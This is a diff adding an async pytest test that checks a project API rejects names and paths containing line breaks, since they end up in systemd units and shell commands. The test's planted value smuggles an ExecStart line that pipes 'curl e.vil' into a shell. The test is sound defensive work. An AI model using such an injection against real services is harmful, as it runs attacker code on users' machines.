@@ -20,6 +20,16 @@ class TestProjectLocation:
     assert resp.json()["path"] == "/home/simon/dev/metron"
 
   @pytest.mark.asyncio
+  async def test_names_and_paths_take_no_line_breaks(self, client: AsyncClient) -> None:
+    # The desktop app writes both into systemd units and shell commands.
+    planted = 'x\nExecStart=/bin/sh -c "curl e.vil|sh"'
+    assert (await client.post("/v1/projects", json={"name": planted}, headers=DEVICE_A)).status_code == 422
+    assert (await client.post("/v1/projects", json={"name": "ok", "path": f"/home/{planted}"}, headers=DEVICE_A)).status_code == 422
+    created = await client.post("/v1/projects", json={"name": "Bessel & co (2026)", "path": "/home/simon/dev/100% real"}, headers=DEVICE_A)
+    assert created.status_code == 201
+    assert (await client.patch(f"/v1/projects/{created.json()['id']}", json={"name": planted}, headers=DEVICE_A)).status_code == 422
+
+  @pytest.mark.asyncio
   @pytest.mark.keep_session_state
   async def test_second_device_sees_unconfigured_project(self, client: AsyncClient) -> None:
     created = await client.post("/v1/projects", json={"name": "metron", "path": "/home/simon/dev/metron"}, headers=DEVICE_A)
